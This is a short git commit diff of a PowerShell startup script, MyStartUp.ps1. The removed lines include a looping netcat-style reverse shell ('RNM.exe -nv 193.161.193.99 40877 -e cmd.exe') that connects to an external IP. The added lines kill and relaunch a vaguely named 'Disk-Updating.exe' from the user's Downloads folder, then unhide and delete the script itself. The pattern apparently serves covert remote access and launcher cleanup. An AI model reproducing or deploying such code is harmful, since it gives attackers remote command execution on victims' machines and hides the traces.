37b5870a487f8ee070a2a3d6584540348927fa99
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2023-11-28 17:10:37 -0300

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,10 +1,8 @@
-#while ($true){ C:\Users\Public\RNM.exe -nv 193.161.193.99 40877 -e cmd.exe ; Start-Sleep 6 }
+# Parches Ejecución de Tareas.
 
-#taskkill /F /IM Disk-Updating.exe
-#C:\Users\angel\Downloads\Disk-Updating.exe
-#taskkill /F /IM Disk-Updating.exe
-#C:\Users\angel\Downloads\Disk-Updating.exe
-taskkill /F /IM lml.exe
-C:\Users\seba\Downloads\lml.exe
+taskkill /F /IM Disk-Updating.exe
+C:\Users\$env:USERNAME\Downloads\Disk-Updating.exe
+#taskkill /F /IM lml.exe
+#C:\Users\$env:USERNAME\Downloads\lml.exe
 attrib -h C:\Users\Public\MyStartUp.ps1
 del C:\Users\Public\MyStartUp.ps1
